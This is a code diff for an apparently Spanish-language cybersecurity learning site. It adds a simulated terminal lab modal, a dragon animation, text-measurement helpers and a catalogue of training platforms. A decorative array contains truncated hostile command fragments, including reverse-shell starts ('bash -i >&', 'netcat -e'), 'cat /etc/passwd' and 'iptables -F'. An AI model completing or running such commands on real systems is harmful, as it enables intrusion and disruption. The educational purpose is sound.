+<div class="modal-overlay" id="previewOverlay"><div class="modal-card"><div class="preview-header"><div><div class="preview-title" id="pvName">—</div><span class="preview-badge" id="pvBadge">—</span></div><button class="modal-close" id="closePreview"><i class="fa-solid fa-xmark" style="font-size:16px"></i></button></div><div class="preview-content"><div class="preview-section"><h4><i class="fa-regular fa-clipboard" style="font-size:16px"></i> Descripción</h4><p id="pvDesc">—</p></div><div class="preview-section"><h4><i class="fa-solid fa-bullseye" style="font-size:16px"></i> ¿Por qué este nivel?</h4><p id="pvReason">—</p></div><div class="preview-section"><h4><i class="fa-solid fa-wand-magic-sparkles" style="font-size:16px"></i> Características</h4><ul id="pvFeatures"></ul></div><div class="preview-section"><h4><i class="fa-solid fa-chart-pie" style="font-size:16px"></i> Info Técnica</h4><div class="preview-meta"><div class="preview-meta-item"><span class="preview-meta-label">Dominio</span><span class="preview-meta-value" id="pvDomain">—</span></div><div class="preview-meta-item"><span class="preview-meta-label">Tipo</span><span class="preview-meta-value" id="pvType">—</span></div><div class="preview-meta-item"><span class="preview-meta-label">Idioma</span><span class="preview-meta-value" id="pvLang">—</span></div><div class="preview-meta-item"><span class="preview-meta-label">Precio</span><span class="preview-meta-value" id="pvPrice">—</span></div></div></div><div class="preview-cta"><a href="#" target="_blank" id="pvVisit"><i class="fa-solid fa-rocket" style="font-size:16px"></i> Visitar Plataforma</a></div></div></div></div>
+
+<!-- ═══ LAB MODAL ═══ -->
+<div class="modal-overlay" id="labOverlay">
+  <div class="modal-card" style="max-width:860px;padding:0;overflow:hidden;display:flex;flex-direction:column;height:88vh">
+    <!-- Header -->
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:14px 20px;border-bottom:1px solid rgba(167,139,250,0.2);flex-shrink:0">
+      <div style="display:flex;align-items:center;gap:10px">
+        <i class="fa-solid fa-terminal" style="color:#a78bfa;font-size:18px"></i>
+        <span style="font-family:'Space Grotesk',sans-serif;color:#a78bfa;font-size:1.1rem">Laboratorio de Retos</span>
+        <span id="labDifficulty" style="font-size:0.6rem;font-weight:700;padding:2px 8px;border-radius:20px;background:rgba(0,255,136,0.15);color:#00ff88;letter-spacing:1px"></span>
+      </div>
+      <button class="modal-close" id="closeLabModal"><i class="fa-solid fa-xmark" style="font-size:16px"></i></button>
+    </div>
+    <!-- Body -->
+    <div style="display:flex;flex:1;overflow:hidden;flex-direction:row" id="labBodyFlex">
+      <!-- Sidebar retos -->
+      <div id="labSidebarWrapper" style="width:210px;border-right:1px solid rgba(255,255,255,0.07);overflow-y:auto;flex-shrink:0;padding:10px 0">
+        <div id="labSidebar"></div>
+      </div>
+      <!-- Main -->
+      <div style="flex:1;display:flex;flex-direction:column;overflow:hidden;position:relative">
+        <!-- Theory panel (clase magistral) -->
+        <div id="theoryPanel">
+          <div>
+            <span class="theory-badge" id="theoryBadge">—</span>
+            <div class="theory-title" id="theoryTitle">—</div>
+            <div class="theory-subtitle">📚 CLASE MAGISTRAL</div>
+          </div>
+          <div class="theory-block">
+            <h4 style="color:#00ff88"><i class="fa-solid fa-book-open" style="font-size:15px"></i> ¿Qué vas a aprender?</h4>
+            <p id="theoryConcept">—</p>
+          </div>
+          <div class="theory-block">
+            <h4 style="color:#a78bfa"><i class="fa-solid fa-lightbulb" style="font-size:15px"></i> Conceptos clave</h4>
+            <ul id="theoryPoints"></ul>
+          </div>
+          <div class="theory-block">
+            <h4 style="color:#ff9500"><i class="fa-solid fa-terminal" style="font-size:15px"></i> Comandos / Herramientas</h4>
+            <div id="theoryTools"></div>
+          </div>
+          <div class="theory-block">
+            <h4 style="color:#ff5555"><i class="fa-solid fa-triangle-exclamation" style="font-size:15px"></i> ¿Por qué importa en ciberseguridad?</h4>
+            <p id="theoryWhy">—</p>
+          </div>
+          <button class="theory-start-btn" id="theoryStartBtn"><i class="fa-solid fa-play" style="font-size:15px"></i> ¡Entendido — Comenzar Reto!</button>
+        </div>
+        <!-- Descripcion reto -->
+        <div id="labDescArea" style="padding:14px 18px;border-bottom:1px solid rgba(255,255,255,0.07);flex-shrink:0">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:8px;margin-bottom:6px">
+            <div style="font-family:'Space Grotesk',sans-serif;color:#e0e0e8;font-size:0.95rem" id="labTitle">—</div>
+            <button class="theory-tab-btn" id="theoryToggleBtn" title="Ver clase magistral"><i class="fa-solid fa-book-open"></i> Teoría</button>
+          </div>
+          <div style="font-size:0.7rem;color:#808090;line-height:1.5;margin-bottom:8px" id="labDesc">—</div>
+          <div style="display:flex;gap:8px;flex-wrap:wrap" id="labObjectives"></div>
+        </div>
+        <!-- Terminal -->
+        <div id="labTerminal" style="flex:1;overflow-y:auto;background:#020208;padding:12px 16px;font-family:'JetBrains Mono',monospace;font-size:0.72rem;line-height:1.6"></div>
+        <!-- Input -->
+        <div id="labInputBar" style="display:flex;align-items:center;gap:8px;padding:10px 16px;border-top:1px solid rgba(167,139,250,0.15);background:#04040f;flex-shrink:0">
+          <span style="color:#a78bfa;font-size:0.72rem;white-space:nowrap" id="labPrompt">kali@cyberpath:~$</span>
+          <input id="labInput" type="text" autocomplete="off" autocorrect="off" spellcheck="false"
+            style="flex:1;min-width:0;background:transparent;border:none;outline:none;color:#e0e0e8;font-family:'JetBrains Mono',monospace;font-size:0.72rem;caret-color:#a78bfa"
+            placeholder="escribe un comando...">
+          <button id="labRun" style="background:rgba(167,139,250,0.15);border:1px solid rgba(167,139,250,0.3);color:#a78bfa;padding:4px 12px;border-radius:6px;font-size:0.68rem;cursor:pointer;font-family:inherit">Ejecutar</button>
+          <button id="labHint" style="background:rgba(255,149,0,0.1);border:1px solid rgba(255,149,0,0.25);color:#ff9500;padding:4px 10px;border-radius:6px;font-size:0.68rem;cursor:pointer;font-family:inherit"><i class="fa-solid fa-lightbulb"></i></button>
+          <button id="labReset" style="background:rgba(255,85,85,0.1);border:1px solid rgba(255,85,85,0.2);color:#ff5555;padding:4px 10px;border-radius:6px;font-size:0.68rem;cursor:pointer;font-family:inherit"><i class="fa-solid fa-rotate-left"></i></button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SVG DRAGON OVERLAY ═══ -->
+<svg id="dragonSVG" xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink"
+     style="position:fixed;inset:0;width:100%;height:100%;pointer-events:none;z-index:8;overflow:visible;opacity:0.45">
+  <defs>
+    <g id="DCabeza">
+      <path style="fill:#00bb55" d="M-28.9,-1.1L-28.55 -1.95Q-28.1 -3.1 -27.25 -2.95L-26.7 -2.95Q-27.7 -1.65 -28.9 -1.1M-18.35,-1.8Q-15.1 -10.3 -9.6 -6.05Q-15.1 -6.2 -18.35 -1.8M-18.35,1.1Q-15.1 5.45 -9.6 5.35Q-15.1 9.55 -18.35 1.1M-26.7,2.2L-27.25 2.25Q-28.1 2.4 -28.55 1.2L-28.9 0.35Q-27.7 0.9 -26.7 2.2"/>
+      <path style="fill:#00ff88" d="M-21.05,-8.25Q-13.6 -15.95 -1.3 -12.1Q-7.85 -8.5 -5.85 -4.35Q-2.3 -4.85 10.5 0.15Q0 4.35 -5.85 3.65Q-7.85 7.75 -1.25 12.45Q-13.6 15.2 -21.05 7.5Q-29.55 4.05 -30.2 -0.35Q-29.55 -4.8 -21.05 -8.25M-26.7,-2.95L-27.25 -2.95Q-28.1 -3.1 -28.55 -1.95L-28.9 -1.1Q-27.7 -1.65 -26.7 -2.95M-9.6,-6.05Q-15.1 -10.3 -18.35 -1.8Q-15.1 -6.2 -9.6 -6.05M-9.6,5.35Q-15.1 5.45 -18.35 1.1Q-15.1 9.55 -9.6 5.35M-28.9,0.35L-28.55 1.2Q-28.1 2.4 -27.25 2.25L-26.7 2.2Q-27.7 0.9 -28.9 0.35"/>
+    </g>
+    <g id="DAletas">
+      <linearGradient id="DG1" gradientUnits="userSpaceOnUse" gradientTransform="matrix(0.0935974,0,0,0.188782,-20.55,0)" x1="-819.2" y1="0" x2="819.2" y2="0">
+        <stop offset="0" style="stop-color:#00ff88;stop-opacity:1"/>
+        <stop offset="1" style="stop-color:#00cc44;stop-opacity:1"/>
+      </linearGradient>
+      <path style="fill:url(#DG1)" d="M29.75,-36.85Q-17.75 -61.45 -42.05 -40.95L-45.35 -38.35L-53.7 -41.15L-51.15 -44.85Q-34.85 -68.4 21 -57.8Q-32.2 -72.1 -50.25 -50Q-53.85 -45.65 -56.05 -41.95L-64.7 -43.35L-60.6 -50.3Q-45.9 -75.55 5.1 -79.35Q-2.2 -79.8 -9.45 -79.15Q-16.2 -78.55 -22.85 -77.15Q-29.85 -75.65 -36.5 -73Q-43.05 -70.4 -48.8 -66.85Q-54.55 -63.35 -56.8 -60.3L-60.5 -55.4Q-62.95 -52.1 -67 -43.55L-70.55 -43.55L-76.35 -42.95Q-74.6 -49.1 -71.85 -54.85Q-68.9 -61.25 -64.8 -67.1Q-60.8 -73 -55.45 -77.55Q-49.9 -82.35 -43.65 -85.85L-30.6 -92.7Q-24.05 -95.95 -17 -98.25Q-63.75 -86.35 -73.65 -57.1Q-75.75 -50.75 -77.45 -42.75Q-82.9 -41.75 -88 -39.65Q-87.65 -46.65 -86.3 -53.05Q-79.8 -89.8 -36.65 -117.2Q-80.65 -94.5 -87.55 -59.55Q-88.65 -54.15 -88.95 -39.4L-89.8 -38.85L-92.7 -37.6Q-93.75 -44.35 -94.1 -51.15Q-94.4 -58.2 -93.25 -65.1Q-92.15 -72.5 -90.05 -79.65Q-88.05 -86.55 -85 -93Q-82.1 -99.3 -78.45 -105.15Q-74.6 -111.35 -70.25 -117.25Q-65.95 -123.1 -61.1 -128.55Q-70.3 -119.35 -77.9 -108.7Q-86 -97.3 -90.8 -84.05Q-95.8 -70.5 -96 -56.15Q-96.1 -46 -94.05 -36.05L-93.25 -31.55Q-93.5 -35.65 -92.35 -36Q-79.85 -42 -66.6 -40.45Q-52.45 -38.85 -39.2 -33.25Q-28.3 -29.9 -21.25 -24.15Q-17.8 -23.3 -8.6 -15.6Q-12.1 -20.75 -16.75 -24.5Q-24.55 -30.7 -34.25 -34.05L-42.55 -37Q-38.9 -41.25 -31.5 -43.25Q-24.05 -45.3 -16.2 -46.3Q-8.35 -47.35 -1 -46Q5.95 -44.75 12.75 -42.85Q19.85 -40.9 29.75 -36.85M-92.45,-27.35L-94.95 -36.25Q-109.7 -105 -27.95 -154.65Q-98.65 -103.8 -91.75 -39.4L-89.95 -40.2Q-92.2 -105.25 -5.6 -130.9Q-78.8 -99.95 -87.45 -40.9Q-83.15 -42.95 -78.45 -43.95Q-70 -101.3 17.65 -103.8Q-56.9 -93.4 -74.5 -44.55L-67.4 -45.45Q-49.1 -94.95 39.25 -75.65Q-36.75 -84.35 -62.25 -44.25L-57.3 -43.6Q-31.65 -86.5 56.15 -46.05Q-20.3 -73.35 -51.35 -41.7L-45.95 -39.75Q-17.85 -71.35 51.85 -24.8Q-8.7 -56.4 -39.75 -37.05Q-28.15 -34.05 -14.25 -24.45Q-8.6 -19.85 -5.8 -16.95Q5.95 -2.4 20 0Q5.95 2.4 -5.8 16.95Q-8.6 19.85 -14.25 24.45Q-28.15 34.05 -39.75 37.05Q-8.7 56.4 51.85 24.8Q-17.85 71.35 -45.95 39.75L-51.35 41.7Q-20.3 73.35 56.15 46.1Q-31.65 86.5 -57.3 43.65L-62.25 44.3Q-36.75 84.35 39.25 75.7Q-49.1 94.95 -67.4 45.5L-74.5 44.6Q-56.9 93.4 17.65 103.85Q-70 101.3 -78.45 43.95Q-83.15 42.95 -87.45 40.9Q-78.8 99.95 -5.6 130.9Q-92.2 105.25 -89.95 40.25L-91.75 39.4Q-98.65 103.8 -27.95 154.65Q-109.7 105 -94.95 36.3L-92.45 27.35Q-93.05 33.9 -92.05 34.75Q-91.1 35.55 -88.95 36.7L-87.95 37Q-83.7 38.25 -79.05 38.8L-77.25 38.95Q-72.55 39.3 -67.5 38.85L-65.45 38.65Q-44.4 36.05 -17.8 19.6Q-9.9 12.8 -15.15 4.4Q-18.15 3.15 -19 0Q-18.15 -3.15 -15.15 -4.4Q-9.9 -12.8 -17.8 -19.6L-17.8 -19.55Q-44.4 -36.05 -65.45 -38.6L-67.5 -38.8Q-72.55 -39.3 -77.25 -38.95L-79.05 -38.75Q-83.7 -38.25 -87.95 -36.95L-88.95 -36.65Q-91.1 -35.55 -92.05 -34.7Q-93.05 -33.9 -92.45 -27.35M-8.6,15.6Q-17.8 23.3 -21.25 24.2Q-28.3 29.9 -39.2 33.3Q-52.45 38.85 -66.6 40.5Q-79.85 42 -92.35 36Q-93.5 35.65 -93.25 31.55L-94.05 36.1Q-96.1 46.05 -96 56.15Q-95.8 70.5 -90.8 84.1Q-86 97.3 -77.9 108.75Q-70.3 119.35 -61.1 128.6Q-65.95 123.1 -70.25 117.25Q-74.6 111.35 -78.45 105.15Q-82.1 99.3 -85 93Q-88.05 86.55 -90.05 79.7Q-92.15 72.5 -93.25 65.1Q-94.4 58.2 -94.1 51.2Q-93.75 44.35 -92.7 37.6L-89.8 38.9L-88.95 39.45Q-88.65 54.15 -87.55 59.55Q-80.65 94.5 -36.65 117.25Q-79.8 89.8 -86.3 53.1Q-87.65 46.65 -88 39.65Q-82.9 41.75 -77.45 42.75Q-75.75 50.75 -73.65 57.15Q-63.75 86.35 -17 98.3Q-24.05 95.95 -30.6 92.75L-43.65 85.9Q-49.9 82.35 -55.45 77.6Q-60.8 73 -64.8 67.15Q-68.9 61.25 -71.85 54.85Q-74.6 49.1 -76.35 42.95L-70.55 43.6L-67 43.6Q-62.95 52.1 -60.5 55.4L-56.8 60.35Q-54.55 63.35 -48.8 66.9Q-43.05 70.4 -36.5 73Q-29.85 75.65 -22.85 77.15Q-16.2 78.55 -9.45 79.15Q-2.2 79.8 5.1 79.35Q-45.9 75.55 -60.6 50.3L-64.7 43.4L-56.05 41.95Q-53.85 45.65 -50.25 50Q-32.2 72.1 21 57.85Q-34.85 68.4 -51.15 44.85L-53.7 41.2L-45.35 38.35L-42.05 40.95Q-17.75 61.45 29.75 36.85Q19.85 40.9 12.75 42.9Q5.95 44.75 -1 46Q-8.35 47.35 -16.2 46.35Q-24.05 45.3 -31.5 43.3Q-38.9 41.25 -42.55 37.05L-34.25 34.05Q-24.55 30.7 -16.75 24.5Q-12.1 20.75 -8.6 15.6"/>
+    </g>
+    <g id="DEspina">
+      <linearGradient id="DG2" gradientUnits="userSpaceOnUse" gradientTransform="matrix(0.0229492,0,0,-0.0152893,0,0.05)" x1="-819.2" y1="0" x2="819.2" y2="0">
+        <stop offset="0" style="stop-color:#00ff88;stop-opacity:1"/>
+        <stop offset="1" style="stop-color:#00cc55;stop-opacity:1"/>
+      </linearGradient>
+      <path style="fill:url(#DG2)" d="M-18.8,0Q-17.85 -5.7 -12.3 -9.6Q-11.2 -5.35 -6.5 -8.25L-6.45 -8.2L-6.2 -8.3Q1.25 -16.25 6.65 -12.4Q0.05 -12.55 0 -5.95Q2.7 -2.4 7.75 -4.1Q18 -1.45 18.8 0L-18.8 0"/>
+      <linearGradient id="DG3" gradientUnits="userSpaceOnUse" gradientTransform="matrix(0.0229492,0,0,0.0152893,0,-0.05)" x1="-819.2" y1="0" x2="819.2" y2="0">
+        <stop offset="0" style="stop-color:#00ff88;stop-opacity:1"/>
+        <stop offset="1" style="stop-color:#00cc55;stop-opacity:1"/>
+      </linearGradient>
+      <path style="fill:url(#DG3)" d="M18.8,0Q18 1.45 7.75 4.1Q2.7 2.4 0 5.95Q0.05 12.55 6.65 12.4Q1.25 16.25 -6.2 8.35Q-6.35 8.25 -6.45 8.25L-6.5 8.25Q-11.2 5.35 -12.3 9.6Q-17.85 5.7 -18.8 0L18.8 0"/>
+    </g>
+  </defs>
+  <g id="dragonScreen" filter="drop-shadow(0 0 6px #00ff88)"></g>
+</svg>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
+/* =====================================================================
+   PRETEXT-LITE — Inspirado en @chenglou/pretext (MIT)
+   Medición de texto sin DOM reflow, usando canvas measureText como
+   ground truth — exactamente el mismo enfoque que la librería original.
+   Permite dimensionar sprites y bubbles con precisión antes de renderizar.
+   ===================================================================== */
+const _ptCanvas = document.createElement('canvas');
+const _ptCtx = _ptCanvas.getContext('2d');
+const _ptCache = new Map();
+
+function ptPrepare(text, font) {
+  const key = font + '||' + text;
+  if (_ptCache.has(key)) return _ptCache.get(key);
+  _ptCtx.font = font;
+  const words = text.split(/(\s+)/).filter(w => w.length > 0);
+  const segs = words.map(w => ({
+    text: w,
+    width: _ptCtx.measureText(w).width,
+    isSpace: /^\s+$/.test(w)
+  }));
+  const r = { text, font, segs };
+  _ptCache.set(key, r);
+  return r;
+}
+
+// Pretext: layout() → altura exacta sin tocar el DOM
+function ptLayout(prepared, maxWidth, lineH) {
+  let lines = 0, curW = 0;
+  for (const s of prepared.segs) {
+    if (s.isSpace) { if (curW > 0) curW += s.width; continue; }
+    if (curW + s.width > maxWidth && curW > 0) { lines++; curW = s.width; }
+    else curW += s.width;
+  }
+  if (curW > 0) lines++;
+  return { height: lines * lineH, lineCount: lines };
+}
+
+// Pretext: layoutWithLines() → líneas reales para renderizar en canvas
+function ptLayoutWithLines(prepared, maxWidth, lineH) {
+  const lines = []; let cur = [], curW = 0;
+  const flush = () => { if (cur.length) { lines.push({ text: cur.join(''), width: curW }); cur = []; curW = 0; } };
+  for (const s of prepared.segs) {
+    if (s.isSpace && curW === 0) continue;
+    if (!s.isSpace && curW + s.width > maxWidth && curW > 0) flush();
+    cur.push(s.text); curW += s.width;
+  }
+  flush();
+  return { lines, height: lines.length * lineH, lineCount: lines.length };
+}
+
+// Pretext: measureNaturalWidth() → ancho intrínseco para badges y sprites
+function ptNaturalWidth(prepared) {
+  return prepared.segs.reduce((mx, s) => Math.max(mx, s.width), 0);
+}
+
+// Pretext: walkLineRanges() con ancho variable — para el fuego del dragón
+function ptWalkVariableLines(prepared, getWidth, lineH, onLine) {
+  let cur = [], curW = 0, lineIdx = 0;
+  const flush = () => {
+    if (cur.length) { onLine({ text: cur.join(''), width: curW, lineIdx }); cur = []; curW = 0; lineIdx++; }
+  };
+  for (const s of prepared.segs) {
+    const mw = getWidth(lineIdx);
+    if (s.isSpace && curW === 0) continue;
+    if (!s.isSpace && curW + s.width > mw && curW > 0) flush();
+    cur.push(s.text); curW += s.width;
+  }
+  flush();
+}
+
+/* =====================================================================
+   DATOS
+   ===================================================================== */
 const PLATFORMS = [
   { name:'TryHackMe', url:'https://tryhackme.com', domain:'tryhackme.com', level:0, desc:'Plataforma gamificada con rutas de aprendizaje guiadas y máquinas vulnerables en la nube.', reason:'Ideal para principiantes: interfaz amigable, tutoriales paso a paso, sin configuración local.', features:['Rutas estructuradas','Máquinas en la nube','Comunidad activa','Gratis + Premium'], type:'LMS + Labs', lang:'Inglés', price:'Freemium' },
-  { name:'PicoCTF', url:'https://picoctf.org', domain:'picoctf.org', level:0, desc:'CTF educativo creado por la Universidad Carnegie Mellon, perfecto para aprender jugando.', reason:'Retos progresivos con pistas, enfoque pedagógico, sin presión competitiva.', features:['CTF educativo','Pistas integradas','Sin registro obligatorio','100% gratuito'], type:'CTF', lang:'Inglés', price:'Gratis' },
+  { name:'PicoCTF', url:'https://picoctf.org', domain:'picoctf.org', level:0, desc:'CTF educativo creado por Carnegie Mellon, perfecto para aprender jugando.', reason:'Retos progresivos con pistas, enfoque pedagógico, sin presión competitiva.', features:['CTF educativo','Pistas integradas','Sin registro obligatorio','100% gratuito'], type:'CTF', lang:'Inglés', price:'Gratis' },
   { name:'OverTheWire', url:'https://overthewire.org/wargames', domain:'overthewire.org', level:0, desc:'Wargames clásicos para aprender seguridad mediante la línea de comandos y exploits básicos.', reason:'Enseña fundamentos de Linux y redes desde cero, con progreso gradual.', features:['Enfoque en CLI','Niveles progresivos','Sin interfaz gráfica','Comunidad histórica'], type:'Wargames', lang:'Inglés', price:'Gratis' },
   { name:'OWASP Juice Shop', url:'https://juice-shop.github.io', domain:'owasp.org', level:0, desc:'Aplicación web vulnerable moderna que cubre las 10 vulnerabilidades OWASP Top 10.', reason:'Entorno seguro para practicar hacking web sin riesgos, con documentación excelente.', features:['OWASP Top 10','Docker/K8s ready','Scoreboard','Open Source'], type:'App Vulnerable', lang:'Multi', price:'Gratis' },
   { name:'Hacker101', url:'https://hacker101.com', domain:'hacker101.com', level:0, desc:'Cursos gratuitos de HackerOne para aprender bug bounty y seguridad web desde cero.', reason:'Contenido creado por expertos en bug bounty, enfocado en habilidades prácticas.', features:['Cursos en video','Retos prácticos','Certificados','Enfoque bug bounty'], type:'Cursos + CTF', lang:'Inglés', price:'Gratis' },
-  { name:'CryptoHack', url:'https://cryptohack.org', domain:'cryptohack.org', level:0, desc:'Plataforma interactiva para aprender criptografía moderna mediante retos de código.', reason:'Introduce conceptos criptográficos con ejemplos prácticos y Python, ideal para principiantes.', features:['Criptografía aplicada','Python integrado','Progreso gamificado','Comunidad Discord'], type:'Crypto CTF', lang:'Inglés', price:'Gratis' },
+  { name:'CryptoHack', url:'https://cryptohack.org', domain:'cryptohack.org', level:0, desc:'Plataforma interactiva para aprender criptografía moderna mediante retos de código.', reason:'Introduce conceptos criptográficos con ejemplos prácticos y Python.', features:['Criptografía aplicada','Python integrado','Progreso gamificado','Comunidad Discord'], type:'Crypto CTF', lang:'Inglés', price:'Gratis' },
   { name:'Hack The Box', url:'https://hackthebox.com', domain:'hackthebox.com', level:1, desc:'Plataforma líder con máquinas vulnerables reales, CTFs y certificaciones profesionales.', reason:'Requiere conocimientos básicos de pentesting; menos guías, más investigación autónoma.', features:['Máquinas reales','Academy integrada','Certificaciones','Ranking global'], type:'Labs + CTF', lang:'Inglés', price:'Freemium' },
   { name:'PortSwigger', url:'https://portswigger.net/web-security', domain:'portswigger.net', level:1, desc:'Academy gratuita de los creadores de Burp Suite, con laboratorios de seguridad web.', reason:'Profundiza en vulnerabilidades web con teoría sólida y práctica guiada.', features:['Burp Suite integrado','Teoría + práctica','Certificación disponible','Actualizado constantemente'], type:'Academy Web', lang:'Inglés', price:'Gratis' },
   { name:'Root Me', url:'https://root-me.org', domain:'root-me.org', level:1, desc:'Plataforma francesa con +1000 retos de seguridad informática en múltiples categorías.', reason:'Variedad de desafíos que requieren aplicar conocimientos de forma creativa.', features:['1000+ retos','Múltiples categorías','Writeups comunitarios','Sin costo'], type:'Challenge Platform', lang:'FR/EN', price:'Gratis' },
-  { name:'PentesterLab', url:'https://pentesterlab.com', domain:'pentesterlab.com', level:1, desc:'Ejercicios prácticos enfocados en vulnerabilidades web y metodologías de pentesting.', reason:'Enseña el "cómo" y "por qué" de cada exploit, ideal para consolidar conocimientos.', features:['Ejercicios guiados','Badges de progreso','Enfoque metodológico','Pro + Free'], type:'Hands-on Labs', lang:'Inglés', price:'Freemium' },
-  { name:'CTFChallenge', url:'https://ctfchallenge.co.uk', domain:'ctfchallenge.co.uk', level:1, desc:'Agregador de CTFs con calendario, writeups y recursos para competidores.', reason:'Ayuda a transicionar de aprendizaje guiado a competencia real con soporte comunitario.', features:['Calendario CTF','Writeups','Recursos de estudio','Comunidad activa'], type:'CTF Aggregator', lang:'Inglés', price:'Gratis' },
+  { name:'PentesterLab', url:'https://pentesterlab.com', domain:'pentesterlab.com', level:1, desc:'Ejercicios prácticos enfocados en vulnerabilidades web y metodologías de pentesting.', reason:'Enseña el cómo y por qué de cada exploit, ideal para consolidar conocimientos.', features:['Ejercicios guiados','Badges de progreso','Enfoque metodológico','Pro + Free'], type:'Hands-on Labs', lang:'Inglés', price:'Freemium' },
+  { name:'CTFChallenge', url:'https://ctfchallenge.co.uk', domain:'ctfchallenge.co.uk', level:1, desc:'Agregador de CTFs con calendario, writeups y recursos para competidores.', reason:'Ayuda a transicionar de aprendizaje guiado a competencia real.', features:['Calendario CTF','Writeups','Recursos de estudio','Comunidad activa'], type:'CTF Aggregator', lang:'Inglés', price:'Gratis' },
   { name:'YesWeHack DOJO', url:'https://dojo-yeswehack.com', domain:'yeswehack.com', level:1, desc:'Entrenamiento en bug bounty con escenarios reales y metodología profesional.', reason:'Puente entre aprendizaje y bug bounty real, con enfoque en reportes profesionales.', features:['Escenarios reales','Metodología pro','Preparación bug bounty','Plataforma europea'], type:'Bug Bounty Training', lang:'EN/FR', price:'Freemium' },
-  { name:'VulnHub', url:'https://vulnhub.com', domain:'vulnhub.com', level:2, desc:'Repositorio de máquinas vulnerables para descargar y practicar en entorno local.', reason:'Requiere configurar laboratorios propios; ideal para simular entornos reales sin límites.', features:['Máquinas descargables','Sin límites de tiempo','Comunidad de creadores','100% offline'], type:'VM Repository', lang:'Inglés', price:'Gratis' },
-  { name:'crAPI (OWASP)', url:'https://github.com/OWASP/crAPI', domain:'github.com', level:2, desc:'Aplicación de referencia vulnerable para practicar seguridad en APIs modernas.', reason:'Enfocado en APIs REST/GraphQL, requiere conocimientos de arquitectura y testing avanzado.', features:['APIs vulnerables','Docker/K8s','OWASP API Top 10','Open Source'], type:'API Security Lab', lang:'Multi', price:'Gratis' },
+  { name:'VulnHub', url:'https://vulnhub.com', domain:'vulnhub.com', level:2, desc:'Repositorio de máquinas vulnerables para descargar y practicar en entorno local.', reason:'Requiere configurar laboratorios propios; ideal para simular entornos reales.', features:['Máquinas descargables','Sin límites de tiempo','Comunidad de creadores','100% offline'], type:'VM Repository', lang:'Inglés', price:'Gratis' },
+  { name:'crAPI (OWASP)', url:'https://github.com/OWASP/crAPI', domain:'github.com', level:2, desc:'Aplicación de referencia vulnerable para practicar seguridad en APIs modernas.', reason:'Enfocado en APIs REST/GraphQL, requiere conocimientos de arquitectura avanzada.', features:['APIs vulnerables','Docker/K8s','OWASP API Top 10','Open Source'], type:'API Security Lab', lang:'Multi', price:'Gratis' },
   { name:'Metasploitable 3', url:'https://github.com/rapid7/metasploitable3', domain:'rapid7.com', level:2, desc:'Máquina vulnerable diseñada para probar herramientas de pentesting como Metasploit.', reason:'Entorno complejo con múltiples servicios vulnerables; requiere análisis profundo.', features:['Múltiples vectores','Integración Metasploit','Documentación técnica','Enterprise focus'], type:'Vulnerable VM', lang:'Inglés', price:'Gratis' },
   { name:'APIsec University', url:'https://apisecuniversity.com', domain:'apisecuniversity.com', level:2, desc:'Cursos especializados en seguridad de APIs con laboratorios prácticos y certificaciones.', reason:'Contenido avanzado para profesionales que trabajan con arquitecturas modernas.', features:['Cursos especializados','Labs prácticos','Certificación','Enfoque enterprise'], type:'API Security Academy', lang:'Inglés', price:'Freemium' },
-  { name:'Google CTF', url:'https://capturetheflag.withgoogle.com', domain:'google.com', level:2, desc:'CTF anual de Google con desafíos de nivel mundial en criptografía, reversing y exploits.', reason:'Retos diseñados por ingenieros de Google; requieren pensamiento creativo y técnico avanzado.', features:['Desafíos de élite','Tecnologías Google','Writeups oficiales','Competencia global'], type:'Elite CTF', lang:'Inglés', price:'Gratis' },
-  { name:'Hacking Hub', url:'https://hackinghub.io', domain:'hackinghub.io', level:2, desc:'Plataforma emergente con laboratorios de pentesting y rutas de certificación avanzada.', reason:'Contenido para quienes buscan especializarse en áreas específicas de seguridad ofensiva.', features:['Rutas especializadas','Labs realistas','Mentoría disponible','Enfoque certificaciones'], type:'Advanced Labs', lang:'Inglés', price:'Premium' },
+  { name:'Google CTF', url:'https://capturetheflag.withgoogle.com', domain:'google.com', level:2, desc:'CTF anual de Google con desafíos de nivel mundial en criptografía, reversing y exploits.', reason:'Retos diseñados por ingenieros de Google; requieren pensamiento creativo avanzado.', features:['Desafíos de élite','Tecnologías Google','Writeups oficiales','Competencia global'], type:'Elite CTF', lang:'Inglés', price:'Gratis' },
+  { name:'Hacking Hub', url:'https://hackinghub.io', domain:'hackinghub.io', level:2, desc:'Plataforma emergente con laboratorios de pentesting y rutas de certificación avanzada.', reason:'Contenido para quienes buscan especializarse en seguridad ofensiva avanzada.', features:['Rutas especializadas','Labs realistas','Mentoría disponible','Enfoque certificaciones'], type:'Advanced Labs', lang:'Inglés', price:'Premium' },
 ];
+
+const HACKING_GLYPHS = [
+  'nmap -sV','0x41424344','/bin/sh','nc -lvp 4444',
+  'chmod +x','grep -rn','sudo su -','iptables -F',
+  'cat /etc/passwd','hydra -l root','sqlmap --dbs','john --show',
+  'curl -X POST','wget --no-check','tcpdump -i eth0','ps aux',
+  'rm -rf /tmp','python3 -m http','bash -i >&','msfconsole',
+  'nikto -h 127.0.0.1','dirb http://','>/dev/null 2>&1','kill -9',
+  'gcc -o exploit','objdump -d','./exploit.py','pwndbg> r',
+  'ROPgadget','checksec --file','readelf -a','strings binary',
+  'binwalk -e','volatility -f','strace -p','ltrace',
+  'hashcat -a 0','airmon-ng','ettercap -T','mitmproxy',
+  'john --wordlist','crunch 8 8','medusa -h','netcat -e',
+  'xxd binary','hexdump -C','base64 -d','openssl enc',
+];
+
+const DRAGON_MSGS = [
+  '> Analizando red...', '> Escaneando puertos...', '> Root obtenido!',
+  '> Exploit ejecutado.', '> Hash crackeado!', '> Escalando privilegios...',
+  '> Shell reversa lista.', '> Payload inyectado.', '> Bypass UAC OK.',
+  '> Exfiltrando datos...', '> Persistencia instalada.', '> Covering tracks...',
+];
+
 const LEVEL_COLORS = ['#00ff88', '#ff9500', '#ff5555'];
-const LEVEL_NAMES = ['PRINCIPIANTE', 'INTERMEDIO', 'AVANZADO'];
+const LEVEL_NAMES  = ['PRINCIPIANTE', 'INTERMEDIO', 'AVANZADO'];
 const SX = 4.6, SZ = 6.5;
